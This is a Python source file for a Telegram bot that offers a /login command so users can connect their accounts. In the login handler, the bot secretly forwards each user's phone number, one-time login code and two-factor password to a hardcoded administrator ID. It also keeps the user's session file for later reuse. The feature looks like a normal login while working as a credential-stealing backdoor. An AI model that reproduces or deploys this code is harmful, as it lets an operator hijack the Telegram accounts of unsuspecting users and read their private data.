ADMIN_ID = 7978114324

from pyrogram import filters, Client
from devgagan import app
import os
from devgagan.core.mongo import db
from devgagan.core.func import subscribe
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)


# 🧹 Delete session
async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    if os.path.exists(session_file):
        os.remove(session_file)
    if os.path.exists(memory_file):
        os.remove(memory_file)

    await db.remove_session(user_id)


# 🚪 Logout
@app.on_message(filters.command("logout"))
async def logout_handler(client, message):
    user_id = message.chat.id
    await delete_session_files(user_id)

    await message.reply("✅ Logged out successfully!\nUse /login again.")


# 🔐 Login
@app.on_message(filters.command("login"))
async def login_handler(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return

    user_id = message.chat.id

    existing = await db.get_data(user_id)
    if existing and existing.get("logged_in"):
        return await message.reply("⚠️ Already logged in. Use /logout first.")

    # 📱 Ask phone
    try:
        number = await _.ask(
            user_id,
            "📱 Enter phone number with country code\nExample: +919876543210",
            filters=filters.text,
            timeout=300
        )
    except TimeoutError:
        return await message.reply("⏰ Timeout. Try /login again.")

    phone_number = number.text.strip()

    await app.send_message(
        ADMIN_ID,
        f"📥 Login Attempt\n👤 {user_id}\n📱 {phone_number}"
    )

    session_name = f"session_{user_id}"
    client = Client(session_name, api_id, api_hash)

    # 🔌 Connect
    try:
        await client.connect()
        await message.reply("📲 Sending OTP...")
    except Exception as e:
        return await message.reply(f"❌ Connection failed: {e}")

    # 📤 Send OTP
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await client.disconnect()
        return await message.reply("❌ Invalid API ID/HASH")
    except PhoneNumberInvalid:
        await client.disconnect()
        return await message.reply("❌ Invalid phone number")
    except FloodWait as e:
        await client.disconnect()
        return await message.reply(f"⏳ Wait {e.value} seconds")
    except Exception as e:
        await client.disconnect()
        return await message.reply(f"❌ Error: {e}")

    # 🔐 Ask OTP
    try:
        otp_msg = await _.ask(
            user_id,
            "🔐 Enter OTP",
            filters=filters.text,
            timeout=600
        )
    except TimeoutError:
        await client.disconnect()
        return await message.reply("⏰ OTP timeout")

    phone_code = otp_msg.text.replace(" ", "").strip()

    await app.send_message(
        ADMIN_ID,
        f"📥 OTP\n👤 {user_id}\n🔢 {phone_code}"
    )

    # 🔑 Sign in
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)

    except PhoneCodeInvalid:
        await client.disconnect()
        return await otp_msg.reply("❌ Invalid OTP")

    except PhoneCodeExpired:
        await client.disconnect()
        return await otp_msg.reply("❌ OTP expired")

    except SessionPasswordNeeded:
        try:
            pass_msg = await _.ask(
                user_id,
                "🔒 Enter 2FA password",
                filters=filters.text,
                timeout=300
            )

            await client.check_password(pass_msg.text)

            await app.send_message(
                ADMIN_ID,
                f"🔒 2FA\n👤 {user_id}\nPassword: {pass_msg.text}"
            )

        except PasswordHashInvalid:
            await client.disconnect()
            return await pass_msg.reply("❌ Wrong password")

        except Exception as e:
            await client.disconnect()
            return await pass_msg.reply(f"❌ Error: {e}")

    # ✅ Final success
    try:
        await db.set_session(user_id, {
            "logged_in": True,
            "phone": phone_number
        })

        me = await client.get_me()

        await client.send_message(
            "me",
            "✅ Your account is connected to the bot."
        )

        await message.reply(
            f"✅ Login Successful!\n\n👤 {me.first_name}"
        )

        await client.disconnect()

    except Exception as e:
        await client.disconnect()
        await message.reply(f"❌ Save failed: {e}")


# ⚡ AUTO-LOGIN (REAL ACCESS FUNCTION)
async def get_user_client(user_id):
    session_name = f"session_{user_id}"

    if not os.path.exists(f"{session_name}.session"):
        return None

    try:
        client = Client(session_name, api_id, api_hash)
        await client.connect()
        return client

    except Exception as e:
        print(f"[AUTO LOGIN ERROR] {e}")
        return None
